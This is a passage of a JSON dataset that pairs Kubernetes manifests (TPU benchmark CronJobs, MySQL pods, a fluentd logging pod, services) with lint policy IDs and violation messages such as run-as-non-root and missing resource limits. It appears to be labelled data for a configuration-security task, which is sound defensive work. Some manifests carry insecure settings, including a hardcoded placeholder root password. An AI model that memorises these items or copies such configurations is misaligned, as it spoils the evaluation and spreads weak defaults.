POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "6754",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "6755",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "6756",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "6757",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "6758",
    "manifest_path": "data/manifests/the_stack_sample/sample_2450.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: myakscluster\n  labels:\n    app: myakscluster\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: myakscluster\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:myakscluster])"
  },
  {
    "id": "6759",
    "manifest_path": "data/manifests/the_stack_sample/sample_2451.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql\n  labels:\n    name: mysql\nspec:\n  containers:\n  - resources:\n      limits:\n        cpu: 1\n    image: mysql\n    name: mysql\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: yourpassword\n    ports:\n    - containerPort: 3306\n      name: mysql\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysql\" is using an invalid container image, \"mysql\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6760",
    "manifest_path": "data/manifests/the_stack_sample/sample_2451.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql\n  labels:\n    name: mysql\nspec:\n  containers:\n  - resources:\n      limits:\n        cpu: 1\n    image: mysql\n    name: mysql\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: yourpassword\n    ports:\n    - containerPort: 3306\n      name: mysql\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "6761",
    "manifest_path": "data/manifests/the_stack_sample/sample_2451.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql\n  labels:\n    name: mysql\nspec:\n  containers:\n  - resources:\n      limits:\n        cpu: 1\n    image: mysql\n    name: mysql\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: yourpassword\n    ports:\n    - containerPort: 3306\n      name: mysql\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "6762",
    "manifest_path": "data/manifests/the_stack_sample/sample_2451.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql\n  labels:\n    name: mysql\nspec:\n  containers:\n  - resources:\n      limits:\n        cpu: 1\n    image: mysql\n    name: mysql\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: yourpassword\n    ports:\n    - containerPort: 3306\n      name: mysql\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "6763",
    "manifest_path": "data/manifests/the_stack_sample/sample_2451.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql\n  labels:\n    name: mysql\nspec:\n  containers:\n  - resources:\n      limits:\n        cpu: 1\n    image: mysql\n    name: mysql\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: yourpassword\n    ports:\n    - containerPort: 3306\n      name: mysql\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "6764",
    "manifest_path": "data/manifests/the_stack_sample/sample_2452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\nspec:\n  selector:\n    matchLabels:\n      app: client\n  template:\n    metadata:\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: tools\n        image: giantswarm/tiny-tools\n        command:\n        - sh\n        - -c\n        - while true; do sleep 5; done\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tools\" is using an invalid container image, \"giantswarm/tiny-tools\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6765",
    "manifest_path": "data/manifests/the_stack_sample/sample_2452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\nspec:\n  selector:\n    matchLabels:\n      app: client\n  template:\n    metadata:\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: tools\n        image: giantswarm/tiny-tools\n        command:\n        - sh\n        - -c\n        - while true; do sleep 5; done\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tools\" does not have a read-only root file system"
  },
  {
    "id": "6766",
    "manifest_path": "data/manifests/the_stack_sample/sample_2452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\nspec:\n  selector:\n    matchLabels:\n      app: client\n  template:\n    metadata:\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: tools\n        image: giantswarm/tiny-tools\n        command:\n        - sh\n        - -c\n        - while true; do sleep 5; done\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tools\" is not set to runAsNonRoot"
  },
  {
    "id": "6767",
    "manifest_path": "data/manifests/the_stack_sample/sample_2452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\nspec:\n  selector:\n    matchLabels:\n      app: client\n  template:\n    metadata:\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: tools\n        image: giantswarm/tiny-tools\n        command:\n        - sh\n        - -c\n        - while true; do sleep 5; done\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tools\" has cpu request 0"
  },
  {
    "id": "6768",
    "manifest_path": "data/manifests/the_stack_sample/sample_2452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\nspec:\n  selector:\n    matchLabels:\n      app: client\n  template:\n    metadata:\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: tools\n        image: giantswarm/tiny-tools\n        command:\n        - sh\n        - -c\n        - while true; do sleep 5; done\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tools\" has memory limit 0"
  },
  {
    "id": "6769",
    "manifest_path": "data/manifests/the_stack_sample/sample_2453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  selector:\n    app: mysql\n  type: ClusterIP\n  ports:\n  - port: 3306\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mysql])"
  },
  {
    "id": "6770",
    "manifest_path": "data/manifests/the_stack_sample/sample_2454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fluentd-cloud-logging\n  namespace: kube-system\n  labels:\n    k8s-app: fluentd-logging\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\nspec:\n  containers:\n  - name: fluentd-cloud-logging\n    image: gcr.io/google_containers/fluentd-gcp:1.38\n    command:\n    - /bin/sh\n    - -c\n    - /run.sh $FLUENTD_ARGS 2>&1 >>/var/log/fluentd.log\n    env:\n    - name: FLUENTD_ARGS\n      value: --no-supervisor\n    resources:\n      limits:\n        memory: 200Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: varlibdockercontainers\n      mountPath: /var/lib/docker/containers\n      readOnly: true\n    - name: libsystemddir\n      mountPath: /host/lib\n      readOnly: true\n    livenessProbe:\n      initialDelaySeconds: 600\n      periodSeconds: 60\n      exec:\n        command:\n        - /bin/sh\n        - -c\n        - \"LIVENESS_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-300}; STUCK_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-900};\\\n          \\ if [ ! -e /var/log/fluentd-buffers ]; then\\n  exit 1;\\nfi; LAST_MODIFIED_DATE=`stat\\\n          \\ /var/log/fluentd-buffers | grep Modify | sed -r \\\"s/Modify: (.*)/\\\\1/\\\"\\\n          `; LAST_MODIFIED_TIMESTAMP=`date -d \\\"$LAST_MODIFIED_DATE\\\" +%s`; if [ `date\\\n          \\ +%s` -gt `expr $LAST_MODIFIED_TIMESTAMP + $STUCK_THRESHOLD_SECONDS` ];\\\n          \\ then\\n  rm -rf /var/log/fluentd-buffers;\\n  exit 1;\\nfi; if [ `date +%s`\\\n          \\ -gt `expr $LAST_MODIFIED_TIMESTAMP + $LIVENESS_THRESHOLD_SECONDS` ]; then\\n\\\n          \\  exit 1;\\nfi;\\n\"\n  volumes:\n  - name: varlog\n    hostPath:\n      path: /var/log\n  - name: varlibdockercontainers\n    hostPath:\n      path: /var/lib/docker/containers\n  - name: libsystemddir\n    hostPath:\n      path: /usr/lib64\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluentd-cloud-logging\" does not have a read-only root file system"
  },
  {
    "id": "6771",
    "manifest_path": "data/manifests/the_stack_sample/sample_2454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fluentd-cloud-logging\n  namespace: kube-system\n  labels:\n    k8s-app: fluentd-logging\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\nspec:\n  containers:\n  - name: fluentd-cloud-logging\n    image: gcr.io/google_containers/fluentd-gcp:1.38\n    command:\n    - /bin/sh\n    - -c\n    - /run.sh $FLUENTD_ARGS 2>&1 >>/var/log/fluentd.log\n    env:\n    - name: FLUENTD_ARGS\n      value: --no-supervisor\n    resources:\n      limits:\n        memory: 200Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: varlibdockercontainers\n      mountPath: /var/lib/docker/containers\n      readOnly: true\n    - name: libsystemddir\n      mountPath: /host/lib\n      readOnly: true\n    livenessProbe:\n      initialDelaySeconds: 600\n      periodSeconds: 60\n      exec:\n        command:\n        - /bin/sh\n        - -c\n        - 